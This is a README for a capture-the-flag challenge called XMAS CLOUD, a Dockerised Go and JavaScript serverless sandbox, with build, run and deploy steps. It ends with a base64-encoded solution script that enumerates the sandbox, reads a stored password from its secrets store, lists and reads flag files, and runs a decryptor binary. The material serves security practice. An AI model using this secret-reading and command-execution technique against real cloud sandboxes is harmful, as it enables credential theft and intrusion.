# XMAS CLOUD Challenge

Everyone is moving into the cloud with its fancy serverless apps written in JavaScript. Even through Santa is an old fashioned man, he cannot avoid the change any longer. However, to protect the north pole's data, Santa has developed his own cloud service: the XMAS CLOUD!

## Build with Docker

```bash
docker-compose build
```

## Run with Docker

Add flag to ``flag.txt`` and run:

```bash
docker-compose up --build
```

The sock server is exposed on TCP port 6. You can change it in the ``docker-compose.yml``. The compose file adding a few hardening measurements to the container (e.g. read-only FS). Avoid running the server without those measurements. ;-) Internet access might be possible [1]. However, I don't know any way to exploit it.

[1] You can restrict Internet access, too, [configuring a Network](https://docs.docker.com/compose/networking/) and (iptables restrictions](https://stackoverflow.com/a/64464693)

## Build without Docker

First install [go](https://golang.org/). Next you have to install the go dependencies:

```bash
go get
```

The project is using [Go Modules](https://github.com/golang/go/wiki/Modules).

```bash
# Linux AMD64 portable
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build
```

You need to restore the [npm](https://nodejs.org/en/download/) dependencies, too:
```
npm install
```

## Usage without Docker

Print usage:
```bash
./xmas-cloud
```

## Deploy to Azure App Services

```bash
docker-compose build
docker login svento.azurecr.io --username svento
docker tag xmas-cloud_xmas-cloud:latest svento.azurecr.io/xmas-cloud:latest
docker push svento.azurecr.io/xmas-cloud:latest
```

## Solution

    LyogWE1BUyBDTE9VRCBTb2x1dGlvbiBDb2RlICovCgpmdW5jdGlvbiBsb2dKU09OKGRhdGEpIHsKICAgIGNvbnNvbGUubG9nKCJcbmBgYGpzb25cbiIgKyBKU09OLnN0cmluZ2lmeShkYXRhLCBudWxsLCAzKSArICJcbmBgYFxuIik7Cn0KCmNvbnNvbGUubG9nKCIjIFNvbHV0aW9uXG4iKTsKCi8vIFdheSB0byB0aGUgc29sdXRpb246CmxvZ0pTT04odGhpcyk7CmNvbnNvbGUubG9nKE9iamVjdC5nZXRPd25Qcm9wZXJ0eU5hbWVzKHRoaXMuc2VjcmV0cykpOwpjb25zb2xlLmxvZyh0aGlzLnNlY3JldHMubGlzdCgpKTsKY29uc29sZS5sb2codGhpcy5zZWNyZXRzLmdldCgiY3J5cHRvclBhc3N3b3JkIikpOwpjb25zb2xlLmxvZyhPUy5scygiL2JpbiIpKTsKY29uc29sZS5sb2coT1MubHMoIi9mbGFnIikpOwpjb25zb2xlLmxvZyhPUy5yZWFkRmlsZSgiL2ZsYWcvUkVBRE1FLnR4dCIpKTsKLy8gU29sdXRpb246CmNvbnNvbGUubG9nKE9TLmV4ZWMoIi9iaW4veG1hcy1jcnlwdG9yIiwiZGVjcnlwdCIsIHRoaXMuc2VjcmV0cy5nZXQoImNyeXB0b3JQYXNzd29yZCIpLCBPUy5yZWFkRmlsZSgiL2ZsYWcvZmxhZy54bWFzY3J5cHQiKSkp